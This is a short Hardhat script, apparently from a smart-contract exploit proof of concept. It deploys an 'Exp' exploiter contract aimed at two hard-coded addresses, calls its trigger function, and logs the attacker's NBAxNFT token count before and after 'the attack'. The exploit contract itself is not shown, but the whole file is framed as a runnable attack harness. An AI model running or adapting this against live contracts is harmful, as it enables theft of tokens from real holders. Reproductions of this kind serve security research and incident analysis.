// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {
  const Exp = await hre.ethers.getContractFactory("Exp");
  const exp = await Exp.deploy("0x9b8b9c7C02be0bD0AA4D669bF6a1f6003424c6Dc", "0xDD5A649fC076886Dfd4b9Ad6aCFC9B5eb882e83c");

  await exp.deployed();

  console.log("[#] 🧛 Exploiter deployed to:", exp.address)

  console.log("[#] 🥷  Start Attack...")

  const before = await exp.getter();

  console.log("[#] 🧛 Number of NBAxNFT held by the hacker before the attack: ", before.toString());  

  await exp.trigger();

  const after = await exp.getter();

  console.log("[#] 🧛 Number of NBAxNFT held by the hacker after the attack: ", after.toString());  

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
